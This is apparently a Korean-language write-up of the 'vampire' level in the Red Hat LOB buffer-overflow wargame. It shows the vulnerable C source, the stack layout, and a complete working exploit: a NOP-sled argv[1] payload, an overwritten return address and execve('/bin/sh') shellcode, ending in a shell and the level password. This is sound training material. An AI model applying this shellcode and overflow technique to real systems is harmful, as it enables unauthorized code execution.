============================================================================================================
[redhat-lob] (9) vampire
============================================================================================================


.. graphviz::

    digraph foo {
        a -> b -> c -> d -> e;

        a [shape=box, label="argv[1] value"];
        b [shape=box, color=lightblue, label="strcpy"];
        c [shape=box, label="Buffer Overflow"];
        d [shape=box, label="RET"];
        e [shape=box, label="argv[1] address"];
    }


|

Source Code
============================================================================================================


.. code-block:: c

    #include <stdio.h>
    #include <stdlib.h>

    main(int argc, char *argv[])
    {
        char buffer[40];

        if(argc < 2){
            printf("argv error\n");
            exit(0);
        }

        if(argv[1][47] != '\xbf')
        {
            printf("stack is still your friend.\n");
            exit(0);
        }

        // here is changed!
        if(argv[1][46] == '\xff')
        {
            printf("but it's not forever\n");
            exit(0);
        }

        strcpy(buffer, argv[1]);
        printf("%s\n", buffer);
        printf("%p\n", buffer);
    }


|

Vulnerabliity Vector
============================================================================================================

스택 메모리 공간에 다음과 같이 들어가게 된다.

.. code-block:: console

    ================
    LOW     
    ----------------
    Buffer  (40byte)
    SFP     (4byte)
    RET     (4byte)  <- strcpy overflow
    argc    (4byte)  <- 0x00000002
    argv    (4byte)  <- argv 주소
    ----------------
    HIGH    
    ================

|

Buffer Overflow
============================================================================================================

Overflow condition 

- argv[1] value의 47번째 문자가 "\\xbf"이어야 함
- argv[1] value의 46번째 문자가 "\\xff"가 아니어야 함

.. code-block:: console

    ※ 시작시 bash2 명령을 입력하고 bash2 쉘 상태에서 진행
    $ bash2
    $ ./vampire2 `python -c 'print "a"*47'`

    stack is still your friend.

    $ ./vampire2 `python -c 'print "a"*47+"\xbf"'`

    aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa▒
    Segmentation fault



|

exploit
============================================================================================================

argv[1]의 주소값 변경
------------------------------------------------------------------------------------------------------------

argv[1]의 주소가 "\\xbf\\xff"로 시작하기 때문에 argv[1]에 nop를 100000만큼 삽입하여 주소값을 "\\xbf\\xfe"로 시작하도록 한다.

.. code-block:: console

    $ ./vampire2 `python -c 'print "a"*47+"\xbf"+"\x90"*100000'`
    buffer : 0xbffe7460
    argv[1]: 0xbffe74d8

    Segmentation fault

|

RET 주소를 argv[1] 주소로 변경하여 공격 진행
------------------------------------------------------------------------------------------------------------

.. code-block:: console

    ================
    LOW     
    ----------------
    Buffer  (40byte) <- "\x90"*40
    SFP     (4byte)  <- "\x90"*4
    RET     (4byte)  <- argv[1] address
    argc    (4byte)  <- 0x00000002
    argv    (4byte)  <- argv[0] 주소
    argv[1] (4byte)  <- "\x90"*100000 + shellcode
    ----------------
    HIGH    
    ================

|

nop (44 byte) + argv[1] address + nop (100000 byte) + shellcode (25 byte)

.. code-block:: console

    $ ./vampire `python -c 'print "\x90"*44 + "\xd8\x74\xfe\xbf" + "\x90"*100000 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`

    ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒1▒Ph//shh/bin▒▒PS▒▒°
                                           ̀▒▒▒▒

    bash$ whoami
    vampire
    bash$ my-pass
    euid = 509
    music world
